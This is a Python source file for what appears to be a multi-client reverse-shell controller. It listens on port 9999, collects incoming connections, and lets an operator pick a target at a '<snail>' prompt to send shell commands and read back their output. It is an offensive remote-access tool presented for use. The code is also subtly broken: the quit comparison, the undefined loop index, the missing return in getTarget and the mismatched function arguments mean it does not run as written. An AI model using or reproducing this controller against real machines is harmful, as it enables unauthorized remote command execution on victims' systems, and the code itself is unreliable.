import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []

#create socket
def socketCreate():
    try:
        global host
        global port 
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print(f"Error creating socket: {str(msg)}")

#bind socket to port and wait for client
def socketBind():
    try:
        global host
        global port 
        global s
        print(f"Binding socket to port {str(port)}")
        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print(f"Error binding socket: {str(msg)}\n Retrying...")
        socketBind()

#establish a connection with client
#def socketAccept():
#    conn, address = s.accept()
#   print(f"Connection has been established.\nIP: {str(address[0])} \nPORT: {str(address[1])}")
#    sendCommands(conn)
#    conn.close()

#send commands
def sendCommands(conn):
    while True:
        cmd = input()
        if cmd == quit:
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")


#accept connections from multiple clients and save to list
def acceptConnections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print(f"\nConnection established with {address[0]}.")
        except:
            print("Error establishing connection(s).")

#Interactive remote command prompt
def startSnail():
    cmd = input('<snail>')
    if cmd == 'list':
        listConnections()
    elif 'select' in cmd:
        conn = getTarget(cmd)
        if conn is not None:
            sendTargetCommands(conn)
        else:
            print("Invalid command.")

#display active connections
def listConnections():
    results = ""
    for conn in enumerate(all_connections):
        try:
            conn.send(str.encode(" "))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + '   ' + str(all_addresses[i][0]) + ":" + str(all_addresses[i][1]) + "\n"
    print("--===Clients===--\n" + results)

def getTarget(cmd):
    try:
        target = cmd.replace("select ", "")
        target = int(target)
        conn = all_connections[target]
        print(f"Connected to {all_addresses[target][0]}.")
        print("<" + str(all_addresses[target][0]) + ">", end="")
    except:
        print("Invalid selection.")
        return None

#connect to remote client
def sendTargetCommands():
    while True:
        try:
            cmd = input()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
            if cmd == "exit":
                break
        except:
            print("Connection lost.")
            break

#create worker threads
def createWorkers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

#each list item is a new job
def createJobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

#do the next job in queue
def work():
    while True:
        x = queue.get()
        if x == 1:
            socketCreate()
            socketBind()
            acceptConnections()
        if x == 2:
            startSnail()
        queue.task_done()


def main():
    createWorkers()
    createJobs()
    socketCreate()
    socketBind()
    acceptConnections()
#    socketAccept()

main()